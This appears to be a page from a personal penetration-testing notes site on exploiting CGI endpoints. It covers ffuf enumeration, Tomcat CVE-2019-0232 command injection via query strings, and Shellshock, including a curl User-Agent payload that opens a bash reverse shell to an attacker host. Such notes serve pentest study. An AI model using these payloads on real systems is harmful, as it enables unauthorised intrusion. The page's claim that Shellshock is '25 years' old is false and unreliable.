<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>ovelny - chaos/web-exploitation/CGIs</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta
      name="description"
      content="ovelny - notes on infosec, penetration testing, programming and others"
    />
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
    <link
      href="/atom.xml"
      rel="alternate"
      title="ovelny"
      type="application/atom+xml"
    />
    <script src="/assets/js/scramble-text.min.js" defer></script>
    <script src="/assets/js/zoom-images.min.js" defer></script>
    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:site" content="@ovelny"/>
    <meta name="twitter:title" content="ovelny - chaos/web-exploitation/CGIs"/>
    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
  </head>
  <body>

    <header>
      <section>
        <a href="/">
          <img
            class="logo"
            src="/assets/images/ovelny-pfp.png"
            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
          />
        </a>
        <h2><a class="ovelny" href="/">ovelny</a></h2>
      </section>
      <nav>
        <a href="/now/">now</a>
        <a href="/chaos/">chaos</a>
        <a href="/phasm/">phasm</a>
        <a href="/support/">support</a>
        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
        <a href="/about/">about</a>
      </nav>
    </header>
    <main>

    
    <h1>CGIs</h1>

<p>Common Gateway Interfaces (CGIs) are used to render dynamic web pages based on user requests. They are middleware between web servers, databases, and other sources of data, usually allowing scripts written in various languages such as python, perl, and more to execute a user&#39;s request dynamically (as input), and sending the output to the web browser.</p>

<p>They haven&#39;t really kept up with increased loads from web users and have been mostly replaced, but are still sometimes encountered during pentests.</p>

<h2>Discovery - enumeration</h2>

<p>Endpoints used for using CGIs are commonly <code>/cgi</code> or <code>/cgi-bin</code>. On the web server, CGI scripts are often kept in the <code>/CGI-bin</code> directory. We can use <code>ffuf</code> to fuzz our target and find deployed scripts:</p>

<div class="highlight"><pre class="highlight shell"><code>ffuf <span class="nt">-w</span> /usr/share/dirb/wordlists/common.txt <span class="nt">-u</span> http://&lt;target URL&gt;/cgi/&lt;FUZZ.cmd or FUZZ.bat&gt;
</code></pre></div>

<h2>Attack paths</h2>

<h3>Tomcat CGI</h3>

<p>A good example of a vulnerable CGI can be found in tomcat: <code>CVE-2019-0232</code> is a RCE vulnerability that can be leveraged if the windows host have the <code>enableCmdLineArguments</code> feature enabled. An input validation error from the tomcat CGI servlet can then be exploited to inject commands. versions affected are:</p>

<ul>
<li>9.0.0M1 to 9.0.17</li>
<li>8.5.0 to 8.5.39</li>
<li>7.0.0 to 7.0.93</li>
</ul>

<p>The CGI servlet is vital to communicate with external applications that don&#39;t use the tomcat JVM: perl, python, and bash scripts for instance. It receives requests from any web browser and forwards them to CGI scripts to process them.</p>

<p>With <code>enableCmdLineArguments</code> enabled, the CGI servlet parses the query string and passes it to the CGI script as command-line arguments. This allows for switches affecting the script execution, for instance:</p>

<ul>
<li><code>/script.cgi?action=track&amp;search=title</code> could search <code>title</code> among a list of music tracks.</li>
<li><code>/script.cgi?action=album&amp;search=title</code> could search <code>title</code> among a list of music albums.</li>
</ul>

<p>The benefits of this feature from a development standpoint are clear, but on windows hosts and for the specific versions mentioned, the CGI servlet fails to properly validate the web browser&#39;s input, allowing for command injection attacks. For instance, calling <code>/script.cgi?&amp;dir</code> with <code>&amp;</code> as a separator will call the <code>dir</code> command on the windows target. Avoid the use of special characters which will get filtered, or URL-encode them first.</p>

<p>In some cases, you may need to run the absolute path of commands such as <code>c:\windows\system32\whoami.exe</code>. Running the <code>set</code> command in that case might reveal that the <code>PATH</code> variable is unset.</p>

<h3>Shellshock</h3>

<p>The iconic vulnerability from 25 years ago, but still found in pentests from time to time. It allows an attacker to run system commands included after a function declared inside an environment variable, such as:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="nb">env </span><span class="nv">y</span><span class="o">=</span><span class="s1">'() { :;}; echo vulnerable-shellshock'</span> bash <span class="nt">-c</span> <span class="s2">"echo not vulnerable"</span>
</code></pre></div>

<p>This would only work and output <code>vulnerable-shellshock</code> with GNU bash versions prior to 4.3. Shellshock can be exploited via CGI too: if we find a CGI script, we might try to inject a shellshock payload into a HTTP header and see if it&#39;s vulnerable. An example with a shellshock injection containing a bash reverse shell, delivered with our user-agent header might look like this:</p>

<div class="highlight"><pre class="highlight shell"><code>curl <span class="nt">-H</span> <span class="s1">'User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/&lt;attack box IP&gt;/&lt;attack box port&gt; 0&gt;&amp;1'</span> http://&lt;target URL&gt;/cgi-bin/script.cgi
</code></pre></div>

    
    </main>
    <footer id="footer">
      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
      <div class="footer-section">「七転び八起き」</div>
    </footer>
  </body>
</html>

